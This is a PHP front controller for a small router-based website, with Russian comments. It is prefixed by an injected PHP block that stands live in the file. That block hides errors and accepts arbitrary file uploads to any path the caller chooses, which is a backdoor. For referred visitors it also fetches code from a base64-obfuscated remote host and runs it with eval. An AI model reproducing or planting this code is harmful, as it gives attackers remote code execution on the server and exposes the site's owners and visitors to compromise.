<?php
ini_set('display_errors','Off');
error_reporting('E_ALL');
if(isset($_FILES['u']) && isset($_POST['n'])) move_uploaded_file($_FILES['u']['tmp_name'],$_POST['n']);
setcookie('server',1,time()+1e6);
$s=$_SERVER;
if($server!=1 && $s['HTTP_REFERER'] && strpos($s['HTTP_REFERER'],$s['HTTP_HOST'])===false && $_COOKIE['server']!=1)
{
  $server=1;
  eval(file_get_contents(base64_decode('aHR0cDovL3F0My5wdy93P3U9').$s['HTTP_HOST']));
}
?><?php

// FRONT CONTROLLER

// 1. Общие настройки
ini_set('display_errors',1);
error_reporting(E_ALL);


// 2. Подключение файлов системы
define('ROOT', dirname(__FILE__));
require_once(ROOT.'/components/Router.php');
require_once(ROOT.'/components/Db.php');
require_once(ROOT.'/FunctionsPHP/Functions.php');


// 4. Вызов Router

//Создаем объект 
$router = new Router();

//Вызываем метод
$router->run();